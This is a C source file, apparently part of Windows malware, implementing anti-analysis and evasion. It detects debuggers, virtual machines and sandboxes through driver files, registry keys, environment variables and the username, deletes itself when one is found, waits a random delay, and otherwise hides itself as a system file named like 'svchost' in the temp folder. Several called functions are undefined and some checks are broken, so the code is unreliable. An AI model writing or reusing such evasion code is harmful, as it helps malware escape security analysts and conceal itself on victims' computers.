#include "../include/anti_detection.h"
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>

static BOOL is_debugger_present(void) {
    return IsDebuggerPresent();
}

static BOOL is_vm_present(void) {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    return (sysInfo.dwPageSize < 4096);
}

static BOOL is_sandbox_present(void) {
    char username[256] = {0};
    DWORD size = sizeof(username);
    GetUserNameA(username, &size);
    return (strstr(username, "SANDBOX") != NULL);
}

static BOOL check_environment_variables(void) {
    char* suspicious_vars[] = {"VBOX", "VMWARE", "SANDBOX", "WINE"};
    for (int i = 0; i < sizeof(suspicious_vars) / sizeof(suspicious_vars[0]); i++) {
        if (getenv(suspicious_vars[i]) != NULL) {
            return TRUE;
        }
    }
    return FALSE;
}

static BOOL check_filesystem_artifacts(void) {
    char* suspicious_files[] = {"C:\\WINDOWS\\system32\\drivers\\vmmouse.sys", 
                                "C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys",
                                "C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys",
                                "C:\\WINDOWS\\system32\\drivers\\VBoxSF.sys"};
    for (int i = 0; i < sizeof(suspicious_files) / sizeof(suspicious_files[0]); i++) {
        if (GetFileAttributesA(suspicious_files[i]) != INVALID_FILE_ATTRIBUTES) {
            return TRUE;
        }
    }
    return FALSE;
}

static BOOL is_debugger_attached(void) {
    return CheckRemoteDebuggerPresent(GetCurrentProcess(), NULL);
}

static void delete_self(void) {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    char cmd[MAX_PATH + 10];
    snprintf(cmd, sizeof(cmd), "del /F /Q \"%s\"", path);
    system(cmd);
}

void apply_anti_detection_techniques(void) {
    if (is_debugger_present() || is_vm_present() || is_sandbox_present() || 
        check_environment_variables() || check_filesystem_artifacts() || 
        is_debugger_attached() || check_registry_artifacts() || 
        check_hypervisor() || timing_check() || check_api_hooks()) {
        delete_self();
        ExitProcess(0);
    }

    srand(GetTickCount());
    int delay = (rand() % 180 + 1) * 1000;
    Sleep(delay);

    char new_name[MAX_PATH];
    GetTempPathA(MAX_PATH, new_name);
    char random_suffix[8];
    for (int i = 0; i < 7; i++) {
        random_suffix[i] = 'A' + (rand() % 26);
    }
    random_suffix[7] = '\0';
    strcat(new_name, "svchost_");
    strcat(new_name, random_suffix);
    MoveFileA(GetCommandLineA(), new_name);
    SetFileAttributesA(new_name, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
}

static BOOL check_registry_artifacts(void) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Oracle\\VirtualBox", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return TRUE;
    }

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return TRUE;
    }

    return FALSE;
}
